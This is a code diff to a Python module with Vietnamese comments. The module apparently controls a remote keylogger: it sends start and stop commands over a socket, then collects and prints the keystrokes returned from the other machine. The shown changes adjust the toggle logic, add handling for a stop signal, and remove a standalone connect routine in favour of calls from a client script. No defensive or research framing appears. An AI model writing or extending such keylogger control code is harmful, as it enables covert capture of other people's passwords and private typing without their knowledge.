@@ -31,6 +31,11 @@ def key_logger(client_socket):
                     print(f'\rKeys pressed: {keys_pressed}')  # In ra các phím đã nhấn
                     keys_pressed = ""  # Reset sau khi nhấn Enter
                     print("Keys pressed: ", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
+                    
+                elif decoded_data == "KEYLOGGER_STOPPED":
+                    print("\nKeylogger has stopped.")
+                    break  # Thoát khỏi vòng lặp để quay về menu chính
+                
                 else:
                     keys_pressed += decoded_data  # Thêm ký tự vào chuỗi
                     
@@ -42,7 +47,7 @@ def key_logger(client_socket):
 
         except Exception as e:
             print(f"Error receiving data: {e}")
-
+            
     listener.join()  # Wait for the listener to finish
 
 def toggle_key_logger(client_socket):
@@ -50,19 +55,9 @@ def toggle_key_logger(client_socket):
     if not keylogger_running:
         client_socket.sendall("START_KEY_LOGGER".encode())
         print("Starting keylogger...")
+        keylogger_running = True
+        key_logger(client_socket)
     else:
         client_socket.sendall("STOP_KEY_LOGGER".encode())
-        print("Stopping keylogger...")
-        
-    keylogger_running = not keylogger_running  # Chuyển trạng thái keylogger
-    if keylogger_running:
-        key_logger(client_socket)  # Gọi key_logger khi khởi động
-
-# Khởi tạo socket và gọi hàm
-def start_key_logger(server_ip, port):
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
-        client_socket.connect((server_ip, port))
-        toggle_key_logger(client_socket)
-
-if __name__ == "__main__":
-    pass  # Đoạn này sẽ được gọi từ client.py
+        # print("Stopping keylogger...")
+        keylogger_running = False
